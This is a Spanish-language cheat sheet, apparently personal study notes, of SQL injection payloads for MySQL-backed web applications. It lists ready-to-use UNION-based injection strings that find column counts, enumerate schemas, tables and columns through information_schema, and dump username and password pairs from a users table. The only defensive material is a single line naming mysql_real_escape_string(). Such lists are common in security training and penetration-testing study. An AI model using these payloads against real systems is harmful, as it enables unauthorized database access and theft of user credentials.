# Cheat Sheet


# SQLI ( Based Error )

#### ORDER BY

```python
Examples:

' order by 100-- -
' order by 1-- -
```

#### UNION SELECT

```python
Examples:

' union select 1-- -
' union select 1,2-- -
' union select NULL,NULL,NULL-- -
```

#### Obtener nombre de la base de datos actualmente en uso con UNION SELECT

```python
Examples:

' union select database()-- -
' union select database(),2-- -
' union select database(),NULL,NULL-- -
' union select NULL,database(),NULL-- -
```

#### obtener nombres de esquemas (databases) de la base de datos utilizando la cláusula `UNION` y la consulta al esquema `information_schema`

```python
Examples:

' union select schema_name from information_schema.schemata-- -
' union select group_concat(schema_name) from information_schema.schemata-- -
' union select group_concat(schema_name) from information_schema.schemata limit 1,1-- -
' union select group_concat(schema_name) from information_schema.schemata limit 2,1-- -
```

#### Enumerar Tablas

```python
Example:

' union select group_concat(table_name) from information_schema.tables where table_schema='(database name)'
```

#### Enumerar Columnas

```python
Examples:

' union select group_concat(column_name) from information_schema.columns where table_schema='(database name)' and table_name='(table name)'-- -

#Alternativa con limit
' union select column_name from information_schema.columns where table_schema='(datbase name)' and table_name='(table name)' limit 1,0-- -
```

#### Dumpear Datos

```python
Examples:

' union select group_concat(username) from users-- -

' union select group_concat(username,password) from users-- -

' union select group_concat(username,':',password) from users-- -

# Siquieres agregar dos puntos para separar el username y password la mejor manera es la siguiente haciendo uso de HEX:
' union select group_concat(username,0x3a,password) from users-- -

# Si quieres dumpear datos de otra base de datos que no es la que esta en uso:
# Suponiendo que 'hack4u' es el nombre de otra base de datos
' union select group_concat(username) from hack4u.users-- -
```

# Sanitizacion

```python
mysql_real_escape_string()
```

##### Example:

![[sanitización.png]]


# 